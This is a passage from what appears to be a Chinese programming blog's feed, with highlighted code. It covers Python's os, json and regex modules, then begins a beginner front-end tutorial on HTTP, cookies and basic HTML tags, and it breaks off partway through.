<span class="hljs-comment"># 输出用于分割文件路径的字符串 win下为;,Linux下为:</span><br>os.name    <span class="hljs-comment"># 输出字符串指示当前使用平台。win-&gt;&#x27;nt&#x27;; Linux-&gt;&#x27;posix&#x27;</span><br>os.system(<span class="hljs-string">&quot;bash command&quot;</span>)  <span class="hljs-comment"># 运行shell命令，直接显示</span><br>os.environ  <span class="hljs-comment"># 获取系统环境变量</span><br>os.path.abspath(path)  <span class="hljs-comment"># ***返回path规范化的绝对路径</span><br>os.path.split(path)  <span class="hljs-comment"># 将path分割成目录和文件名二元组返回</span><br>os.path.dirname(path)  <span class="hljs-comment"># 返回path的目录。其实就是os.path.split(path)的第一个元素</span><br>os.path.basename(path) <span class="hljs-comment">#  返回path最后的文件名。如何path以／或\结尾，那么就会返回空值。即os.path.split(path)的第二个元素</span><br>os.path.exists(path) <span class="hljs-comment">#  ***如果path存在，返回True；如果path不存在，返回False</span><br>os.path.isabs(path)  <span class="hljs-comment"># 如果path是绝对路径，返回True</span><br>os.path.isfile(path)  <span class="hljs-comment"># ***如果path是一个存在的文件，返回True。否则返回False</span><br>os.path.isdir(path)  <span class="hljs-comment"># ***如果path是一个存在的目录，则返回True。否则返回False</span><br>os.path.join(path1[, path2[, ...]])  <span class="hljs-comment"># 将多个路径组合后返回，第一个绝对路径之前的参数将被忽略</span><br>os.path.getatime(path)  <span class="hljs-comment"># 返回path所指向的文件或者目录的最后访问时间</span><br>os.path.getmtime(path)  <span class="hljs-comment"># 返回path所指向的文件或者目录的最后修改时间</span><br>os.path.getsize(path) <span class="hljs-comment"># ***返回path的大小</span><br></code></pre></td></tr></table></figure><p><a name="b7dd76e7"></a></p><h3 id="序列化模块：json（重点）"><a href="#序列化模块：json（重点）" class="headerlink" title="序列化模块：json（重点）"></a>序列化模块：json（重点）</h3><blockquote><p>序列化： 将python中的字典，列表对象转换成指定形式字符串</p><p>反序列化：将指定格式的字符串转换成字典，列表对象</p></blockquote><ul><li>基本使用 </li><li></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br>dic = &#123;<br>    <span class="hljs-string">&#x27;hobby&#x27;</span>:[<span class="hljs-string">&#x27;football&#x27;</span>,<span class="hljs-string">&#x27;pingpang&#x27;</span>,<span class="hljs-string">&#x27;smoke&#x27;</span>],<br>    <span class="hljs-string">&#x27;age&#x27;</span>:<span class="hljs-number">20</span>,<br>    <span class="hljs-string">&#x27;score&#x27;</span>:<span class="hljs-number">97.6</span>,<br>    <span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;zhangsan&#x27;</span><br>&#125;<br><span class="hljs-comment">#序列化：将字典对象转换成了json格式的字符串</span><br>r = json.dumps(dic)<br><span class="hljs-built_in">print</span>(r)<br></code></pre></td></tr></table></figure><p><a name="94b1159a"></a></p><h3 id="正则模块（重点）"><a href="#正则模块（重点）" class="headerlink" title="正则模块（重点）"></a>正则模块（重点）</h3><ul><li>什么是正则表达式？ <ul><li>正则表达式(Regular Expression)是一种文本模式，包括普通字符（例如，a 到 z 之间的字母）和特殊字符（例如，*，+，？等）。</li><li>正则表达式使用单个字符串来描述、匹配一系列匹配某个句法规则的字符串。</li></ul></li><li>常用的正则标识 </li><li></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">单字符：</span><br><span class="hljs-string">. : 除换行以外所有字符</span><br><span class="hljs-string">[] ：[aoe] [a-w] 匹配集合中任意一个字符</span><br><span class="hljs-string">\d ：数字  [0-9]</span><br><span class="hljs-string"></span><br><span class="hljs-string">数量修饰：</span><br><span class="hljs-string">* : 任意多次  &gt;=0</span><br><span class="hljs-string">+ : 至少1次   &gt;=1</span><br><span class="hljs-string">? : 可有可无  0次或者1次</span><br><span class="hljs-string">&#123;m&#125; ：固定m次 hello&#123;3,&#125;</span><br><span class="hljs-string">&#123;m,&#125; ：至少m次</span><br><span class="hljs-string">&#123;m,n&#125; ：m-n次</span><br><span class="hljs-string">边界：</span><br><span class="hljs-string">$ : 以某某结尾 </span><br><span class="hljs-string">^ : 以某某开头</span><br><span class="hljs-string">分组：</span><br><span class="hljs-string">(ab)  </span><br><span class="hljs-string">命名分组：</span><br><span class="hljs-string">(?P&lt;name&gt;正则表达式)，name是一个合法的标识符</span><br><span class="hljs-string">贪婪模式： .*</span><br><span class="hljs-string">非贪婪（惰性）模式： .*?</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>正则在python中的使用 <ul><li>基于re模块进行正则匹配操作 </li><li>主要使用re模块中的findall进行指定规则的匹配 <ul><li>findall(str,rule) <ul><li>str表示即将进行匹配的原始字符串数据</li><li>rule表示指定规则的正则表达式</li><li>findall返回的是列表，列表中存储匹配到的指定内容</li></ul></li></ul></li><li>练习 </li><li></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment">#提取170</span><br>string = <span class="hljs-string">&#x27;我喜欢身高为170的女孩&#x27;</span><br>ex = <span class="hljs-string">&#x27;\d+&#x27;</span><br>result = re.findall(ex,string)<br><span class="hljs-built_in">print</span>(result[<span class="hljs-number">0</span>])<br><span class="hljs-comment">#####################################################################</span><br><span class="hljs-comment">#提取出http和https</span><br>key=<span class="hljs-string">&#x27;http://www.baidu.com and https://boob.com&#x27;</span><br>ex = <span class="hljs-string">&#x27;https?&#x27;</span><br>result = re.findall(ex,key)<br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#####################################################################</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-comment">#提取出hello</span><br>key=<span class="hljs-string">&#x27;lalala&lt;hTml&gt;hello&lt;/HtMl&gt;hahah&#x27;</span><br>ex = <span class="hljs-string">&#x27;&lt;hTml&gt;(.*)&lt;/HtMl&gt;&#x27;</span><br>result = re.findall(ex,key)<br><span class="hljs-built_in">print</span>(result)<br><br><span class="hljs-comment">#####################################################################</span><br><span class="hljs-comment">#提取出hit.</span><br>key=<span class="hljs-string">&#x27;bobo@hit.edu.com&#x27;</span><span class="hljs-comment">#想要匹配到hit.</span><br><span class="hljs-comment"># ex = &#x27;h.*\.&#x27; #贪婪模式</span><br>ex = <span class="hljs-string">&#x27;h.*?\.&#x27;</span> <span class="hljs-comment">#？将正则的贪婪模式调整为非贪婪模式。默认下为贪婪模式</span><br>result = re.findall(ex,key)<br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#####################################################################</span><br><span class="hljs-comment">#匹配sas和saas</span><br>key=<span class="hljs-string">&#x27;saas and sas and saaas&#x27;</span><br>ex = <span class="hljs-string">&#x27;sa&#123;1,2&#125;s&#x27;</span><br>result = re.findall(ex,key)<br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#####################################################################</span><br>key = <span class="hljs-string">&#x27;你好我的手机号是13222222222你记住了吗&#x27;</span><br>ex = <span class="hljs-string">&#x27;1[3,5,7,8,9]\d&#123;9&#125;&#x27;</span><br>result = re.findall(ex,key)<br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#####################################################################</span><br><span class="hljs-comment">#提取ip和端口号</span><br><span class="hljs-keyword">import</span> re<br>s = <span class="hljs-string">&quot;my computer ip is &#x27;230.192.168.78&#x27;,and port is 8889 you got it?&quot;</span><br>rep = re.search(<span class="hljs-string">r&quot;ip is &#x27;(?P&lt;ip&gt;\d+\.\d+\.\d+\.\d+).* port is (?P&lt;port&gt;\d+)&quot;</span>,s)<br>rep.group(<span class="hljs-string">&#x27;ip&#x27;</span>),rep.group(<span class="hljs-string">&#x27;port&#x27;</span>)<span class="hljs-comment">#通过命名分组引用分组</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>前端内容</title>
    <link href="/2020/10/11/%E5%89%8D%E7%AB%AF%E5%86%85%E5%AE%B9/"/>
    <url>/2020/10/11/%E5%89%8D%E7%AB%AF%E5%86%85%E5%AE%B9/</url>
    
    <content type="html"><![CDATA[<p>目的：大致看懂网页的页面源码</p><p><a name="1ad07575"></a></p><h1 id="第1章-、Web的基本概念"><a href="#第1章-、Web的基本概念" class="headerlink" title="第1章 、Web的基本概念"></a>第1章 、Web的基本概念</h1><p><a name="bc3ab6ec"></a></p><h3 id="软件开发的架构"><a href="#软件开发的架构" class="headerlink" title="软件开发的架构"></a>软件开发的架构</h3><ul><li>目前我们了解常见应用程序&#x2F;软件大致可以分为两种： <ul><li>第一种是应用类：qq、微信、网盘、优酷这一类是属于需要安装的桌面应用</li><li>第二种是web类：比如百度、知乎、博客园等使用浏览器访问就可以直接使用的应用</li></ul></li><li>这些应用的本质其实都是两个程序之间的通讯。而这两个分类又对应了两个软件开发的架构： <ul><li>C&#x2F;S架构</li><li>B&#x2F;S架构</li></ul></li></ul><p><a name="a8d91f72"></a></p><h4 id="C-S架构"><a href="#C-S架构" class="headerlink" title="C&#x2F;S架构"></a>C&#x2F;S架构</h4><ul><li>C&#x2F;S即：Client与Server ，中文意思：客户端与服务器端架构。 <ul><li>我们把提供数据的一方称之为服务器(Server),把访问数据的一方称为客户端(Client)</li><li>比如：电脑上要看视频就需要装看视频的程序.例如腾讯视频,它就是客户端程序,腾讯公司的机房里运行着腾讯视频的服务器程序,所以它也是C&#x2F;S构架的程序</li></ul></li></ul><p><a name="3f250849"></a></p><h4 id="B-S架构"><a href="#B-S架构" class="headerlink" title="B&#x2F;S架构"></a>B&#x2F;S架构</h4><ul><li>B&#x2F;S即：Browser与Server,中文意思：浏览器端与服务器端架构。 </li><li>Browser浏览器，其实也是一种Client客户端，只是这个客户端不需要大家去安装什么应用程序，只需在浏览器上通过HTTP请求服务器端相关的资源（网页资源）即可。</li></ul><p><a name="0ed079dd"></a></p><h2 id="1-1、HTTP协议-大致了解"><a href="#1-1、HTTP协议-大致了解" class="headerlink" title="1.1、HTTP协议(大致了解)"></a>1.1、HTTP协议(大致了解)</h2><p><a name="6128129b"></a></p><h3 id="1-1-1-、http协议简介"><a href="#1-1-1-、http协议简介" class="headerlink" title="1.1.1 、http协议简介"></a>1.1.1 、http协议简介</h3><p>HTTP协议是Hyper Text Transfer Protocol（超文本传输协议）的缩写,是用于万维网（WWW:World Wide Web ）服务器与本地浏览器之间传输<strong>超文本</strong>的传送<strong>协议</strong>。</p><p>超文本：超文本就是指“含有指向其他资源链接”内容的文本。大概就是，不仅仅是文字，还有多媒体：视频、图片、动画等。</p><p>协议：HTTP协议就是服务器（Server）和客户端（Client）之间进行数据交互（相互传输数据）的一种协议。我们可以将Server和Client进行拟人化，那么该协议就是Server和Client这两兄弟间指定的一种交互沟通方式。</p><p>HTTP于1990年提出，经过几年的使用与发展，得到不断地完善和扩展。HTTP协议工作于客户端-服务端（B&#x2F;S）架构为上。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。Web服务器根据接收到的请求后，向客户端发送响应信息。</p><p><a name="7ca86a3e"></a></p><h3 id="1-1-2、-http协议特性"><a href="#1-1-2、-http协议特性" class="headerlink" title="1.1.2、 http协议特性"></a>1.1.2、 http协议特性</h3><p><a name="4c14abde"></a></p><h4 id="基于请求－响应模式"><a href="#基于请求－响应模式" class="headerlink" title="基于请求－响应模式"></a>基于请求－响应模式</h4><p>HTTP协议规定,请求从客户端发出,最后服务器端响应该请求并返回。换句话说,肯定是先从客户端开始建立通信的,服务器端在没有接收到请求之前不会发送响应</p><h4 id="无连接"><a href="#无连接" class="headerlink" title="无连接"></a>无连接</h4><p>无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。请思考：双11淘宝平台，一个小时的网站访问量就达到了2亿次，如果一个客户的请求连接耗时1s，那么淘宝是如何实现在一个小时内可以有2亿次的连接访问呢？</p><p><a name="fef82728"></a></p><h4 id="无状态"><a href="#无状态" class="headerlink" title="无状态"></a>无状态</h4><p>HTTP协议 自身不对请求和响应之间的通信状态进行保存。也就是说在HTTP这个级别,协议对于发送过的请求或响应都不做持久化处理。每当有新的请求发送时,就会有对应的新响应产生。协议本身并不保留之前一切的请求或响应的相关信息。这是为了更快地处理大量事务,确保协议的可伸缩性,而特意把HTTP协议设计成如此简单的。</p><p>状态可以理解为客户端和服务器在某次会话中产生的数据，那无状态的就以为这些数据不会被保留。如果会话中产生的数据是我们需要保存的，也就是说要“保持状态”。</p><p>可是,随着Web的不断发展,因无状态而导致业务处理变得棘手的情况增多了。比如,用户登录到一家购物网站,即使他跳转到该站的其他页面后,也需要能继续保持登录状态。网站为了能够掌握是谁送出的请求,需要保存用户的状态。</p><p>HTTP&#x2F;1.1虽然是无状态协议,但为了实现期望的保持状态功能, 于是引入了Cookie技术。有了Cookie再用HTTP协议通信,就可以管理状态了。有关Cookie的详细内容稍后讲解。</p><p><a name="896ef348"></a></p><h3 id="1-1-3、http请求协议与响应协议"><a href="#1-1-3、http请求协议与响应协议" class="headerlink" title="1.1.3、http请求协议与响应协议"></a>1.1.3、http请求协议与响应协议</h3><p>http协议包含由浏览器发送数据到服务器需要遵循的请求协议与服务器发送数据到浏览器需要遵循的响应协议。</p><p>用于HTTP协议交互的信息被称为HTTP报文。请求端(客户端)的HTTP报文叫做请求报文,响应端(服务器端)的叫做响应报文。HTTP报文本身是由多行数据构成的字文本。</p><p><a name="d96c0f12"></a></p><h4 id="1-请求协议"><a href="#1-请求协议" class="headerlink" title="(1) 请求协议"></a>(1) 请求协议</h4><ul><li>请求头： <ul><li>请求头中存储的是该请求的一些主要说明（自我介绍）。服务器据此获取客户端的信息。</li></ul></li></ul><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">accept</span>:浏览器通过这个头告诉服务器，它所支持的数据类型<br><span class="hljs-keyword">Accept</span>-Charset: 浏览器通过这个头告诉服务器，它支持哪种字符集<br><span class="hljs-keyword">Accept</span>-Encoding：浏览器通过这个头告诉服务器，支持的压缩格式<br><span class="hljs-keyword">Accept</span>-Language：浏览器通过这个头告诉服务器，它的语言环境<br>Host：浏览器通过这个头告诉服务器，想访问哪台主机<br><span class="hljs-keyword">If</span>-Modified-Since: 浏览器通过这个头告诉服务器，缓存数据的时间<br>Referer：浏览器通过这个头告诉服务器，客户机是哪个页面来的 防盗链<br>X-Requested-<span class="hljs-keyword">With</span>: XMLHttpRequest 代表通过ajax方式进行访问<br>User-Agent：请求载体的身份标识<br></code></pre></td></tr></table></figure><ul><li>报文体： <ul><li>常被叫做请求体，请求体中存储的是将要传输&#x2F;发送给服务器的数据信息。</li></ul></li></ul><blockquote><p>请求方式: get与post请求</p><ul><li>GET提交的数据会放在URL之后，以?分割URL和传输数据，参数之间以&amp;相连，如EditBook?name&#x3D;test1&amp;id&#x3D;123456.</li><li>POST方法是把提交的数据放在HTTP包的请求体中.</li><li>GET提交的数据大小有限制（因为浏览器对URL的长度有限制），而POST方法提交的数据没有大小限制，且携带的请求数据不可以明文方式连接在url中。</li></ul></blockquote><p><a name="411f5f94"></a></p><h4 id="2-响应协议"><a href="#2-响应协议" class="headerlink" title="(2) 响应协议"></a>(2) 响应协议</h4><ul><li>响应头： <ul><li>响应头中存储的是该响应的一些主要说明（自我介绍）。客户端据此获取服务器的相关信息。</li></ul></li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Location</span>: 服务器通过这个头，来告诉浏览器跳到哪里<br><span class="hljs-keyword">Server</span>：服务器通过这个头，告诉浏览器服务器的型号<br>Content-<span class="hljs-keyword">Encoding</span>：服务器通过这个头，告诉浏览器，数据的压缩格式<br>Content-Length: 服务器通过这个头，告诉浏览器回送数据的长度<br>Content-<span class="hljs-keyword">Language</span>: 服务器通过这个头，告诉浏览器语言环境<br>Content-<span class="hljs-keyword">Type</span>：服务器通过这个头，告诉浏览器回送数据的类型<br><span class="hljs-keyword">Refresh</span>：服务器通过这个头，告诉浏览器定时刷新<br>Content-Disposition: 服务器通过这个头，告诉浏览器以下载方式打数据<br>Transfer-<span class="hljs-keyword">Encoding</span>：服务器通过这个头，告诉浏览器数据是以分块方式回送的<br>Expires: <span class="hljs-number">-1</span> 控制浏览器不要缓存<br><span class="hljs-keyword">Cache</span>-Control: no-<span class="hljs-keyword">cache</span><br>Pragma: no-<span class="hljs-keyword">cache</span><br></code></pre></td></tr></table></figure><ul><li>响应体： <ul><li>根据客户端指定的请求信息，发送给客户端的指定数据</li></ul></li><li>响应状态码： <ul><li>状态码指的是是当客户端向服务器端发送请求时, 返回的请求结果。借助状态码,用户可以知道服务器端是正常受理了请求,还是出现了什么问题错误 。</li></ul></li></ul><p><a name="7b34e5a9"></a></p><h2 id="1-2、Cookie概述（基本了解）"><a href="#1-2、Cookie概述（基本了解）" class="headerlink" title="1.2、Cookie概述（基本了解）"></a>1.2、Cookie概述（基本了解）</h2><p><a name="c56fd507"></a></p><h3 id="1-2-1-COOKIE的由来"><a href="#1-2-1-COOKIE的由来" class="headerlink" title="1.2.1 COOKIE的由来"></a>1.2.1 COOKIE的由来</h3><ul><li>大家都知道HTTP协议是无状态的。 <ul><li>状态可以理解为客户端和服务器在某次会话中产生的数据，那无状态的就以为这些数据不会被保留。每当有新的请求发送时,就会有对应的新响应产生。协议本身并不保留之前一切的请求或响应的相关信息。</li><li>一句有意思的话来描述就是人生只如初见，对服务器来说，每次的请求都是全新的，及时同一个客户端发起的多个请求间。随着Web的不断发展,因无状态而导致业务处理变得棘手的情况增多，因此我们需要解决这个问题，也就是说要让http可以“保持状态”，那么Cookie就是在这样一个场景下诞生。</li></ul></li></ul><p><a name="9b7cc3dd"></a></p><h3 id="1-2-2-什么是cookie"><a href="#1-2-2-什么是cookie" class="headerlink" title="1.2.2 什么是cookie"></a>1.2.2 什么是cookie</h3><ul><li>首先来讲，cookie是浏览器的技术，Cookie具体指的是一段小信息，它是服务器发送出来存储在浏览器上的一组组键值对，可以理解为服务端给客户端的一个小甜点，下次访问服务器时浏览器会自动携带这些键值对，以便服务器提取有用信息。</li></ul><p>记住：cookie表示的键值对数据是由服务器创建，且存储在客户端浏览器中。</p><p><a name="71887b4d"></a></p><h3 id="1-2-3-cookie的原理"><a href="#1-2-3-cookie的原理" class="headerlink" title="1.2.3 cookie的原理"></a>1.2.3 cookie的原理</h3><ul><li>cookie的工作原理是： <ul><li>浏览器访问服务端，带着一个空的cookie，然后由服务器产生内容，浏览器收到相应后保存在本地；</li><li>当浏览器再次访问时，浏览器会自动带上Cookie，这样服务器就能通过Cookie的内容来判断这个是“谁”了。</li><li>cookie的内容是有服务器自主设计的，客户端无法干涉！</li></ul></li></ul><p><a name="2672e126"></a></p><h3 id="1-2-4-cookie的规范"><a href="#1-2-4-cookie的规范" class="headerlink" title="1.2.4 cookie的规范"></a>1.2.4 cookie的规范</h3><ul><li>Cookie大小上限为4KB； </li><li>一个服务器最多在客户端浏览器上保存20个Cookie； </li><li>一个浏览器最多保存300个Cookie，因为一个浏览器可以访问多个服务器。 </li><li>上面的数据只是HTTP的Cookie规范，但在浏览器大战的今天，一些浏览器为了打败对手，为了展现自己的能力起见，可能对Cookie规范“扩展”了一些，例如每个Cookie的大小为8KB，最多可保存500个Cookie等！但也不会出现把你硬盘占满的可能！ </li><li>注意，不同浏览器之间是不共享Cookie的。也就是说在你使用IE访问服务器时，服务器会把Cookie发给IE，然后由IE保存起来，当你在使用FireFox访问服务器时，不可能把IE保存的Cookie发送给服务器。</li></ul><p><a name="19795c7d"></a></p><h1 id="第2章-、HTML（大致对标签进行了解即可）"><a href="#第2章-、HTML（大致对标签进行了解即可）" class="headerlink" title="第2章 、HTML（大致对标签进行了解即可）"></a>第2章 、HTML（大致对标签进行了解即可）</h1><p>了解了web相关基本概念以后，我们开始正式接触网页开发，网页开发的基础是HTML，所以，本章内容主要是学会如何新建一个 HTML 页面和熟记HTML文档的基本结构和主要标签。</p><p><a name="7237b2ad"></a></p><h2 id="2-1、-HTML概述"><a href="#2-1、-HTML概述" class="headerlink" title="2.1、 HTML概述"></a>2.1、 HTML概述</h2><ul><li>HTML，即超文本标记语言（HyperText Markup Language ]），也可叫做web页面。扩展名是 .html 或是 .htm 。 </li><li>HTML，是一种用来制作网页的标准标记语言。超文本，指的就是超出普通文本范畴的文档，可以包含文本、图片、视频、音频、链接等元素。 </li><li>HTML 不是一种编程语言，而是一种写给网页浏览器、具有描述性的标记语言。</li></ul><p>也就是说：使用HTML语言描述的文件，需要通过网页浏览器显示出效果。用户在访问网页时，是把服务器的HTML文档<strong>下载</strong> 到本地客户设备中，然后通过本地客户设备的浏览器将文档按顺序解释渲染成对应的网页效果。</p><p>网页本身是一种文本文件，通过在文本文件中添加各种各样的标记标签，可以告诉<a href="http://baike.baidu.com/view/7718.htm">浏览器</a>如何显示标记中的代表的内容，如：HTML中有的标签可以告诉浏览器要把字体放大，就像word一样，也有的标签可以告诉浏览器显示指定的图片，还有的标签可以告诉浏览器把内容居中或者倾斜等等。</p><p>每一个HTML标签代表的意义都不一样。同样，他们在浏览器中表现出来的外观也是不一样的。</p><p><a name="079d8ac8"></a></p><h2 id="2-2、-HTML结构和标签格式"><a href="#2-2、-HTML结构和标签格式" class="headerlink" title="2.2、 HTML结构和标签格式"></a>2.2、 HTML结构和标签格式</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>1、<code>&lt;!DOCTYPE html&gt;</code> 告诉浏览器使用什么样的解析器来解析<code>html</code>文档</p><p>2、<code>&lt;html&gt;&lt;/html&gt;</code>是文档的开始标记和结束标记。此元素告诉浏览器其自身是一个 <code>HTML</code>文档，在它们之间是文档的头部<code>&lt;head&gt;</code>和主体<code>&lt;body&gt;</code>。</p><p>3、元素出现在文档的开头部分。与之间的内容不会在浏览器的文档窗口显示，但是其间的元素有特殊重要的意义。</p><p>4、<code>&lt;title&gt;&lt;/title&gt;</code>定义网页标题，在浏览器标题栏显示。</p><p>5、<code>&lt;body&gt;&lt;/body&gt;</code>之间的文本是可见的网页主体内容</p><p>6、<code>&lt;meta charset=&quot;UTF-8&quot;&gt;</code>  声明编码方式用utf8</p></blockquote><p><a name="a33208fb"></a></p><h2 id="2-3、标签的语法"><a href="#2-3、标签的语法" class="headerlink" title="2.3、标签的语法"></a>2.3、标签的语法</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">标签名</span> <span class="hljs-attr">属性1</span>=<span class="hljs-string">“属性值1”</span> <span class="hljs-attr">属性2</span>=<span class="hljs-string">“属性值2”……</span>&gt;</span>内容部分<span class="hljs-tag">&lt;/<span class="hljs-name">标签名</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">标签名</span> <span class="hljs-attr">属性1</span>=<span class="hljs-string">“属性值1”</span> <span class="hljs-attr">属性2</span>=<span class="hljs-string">“属性值2”……</span> /&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>1、HTML标签是由尖括号包围的特定关键词</p><p>2、标签分为闭合和自闭合两种标签</p><p>3、HTML不区分大小写</p><p>4、标签可以有若干个属性,也可以不带属性,比如就不带任何属性</p></blockquote><ul><li>注意：网页中显示的我们可以看到的数据&#x2F;内容都只可以存储或者写在标签之间或者属性中！</li></ul><p><a name="2ee7008a"></a></p><h2 id="2-4、基本标签"><a href="#2-4、基本标签" class="headerlink" title="2.4、基本标签"></a>2.4、基本标签</h2><ul><li>标题标签</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>标题1<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>标题2<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>标题3<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>标题4<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h5</span>&gt;</span>标题5<span class="hljs-tag">&lt;/<span class="hljs-name">h5</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h6</span>&gt;</span>标题6<span class="hljs-tag">&lt;/<span class="hljs-name">h6</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>段落标签</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>大家好，我是段落1。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>大家好，我是段落2。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>大家好，我是段落3。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>换行标签</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>大家好，我是段落标签p。我按了enter一下<br>换行了<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>大家好，我是段落标签p。我按了enter一下<span 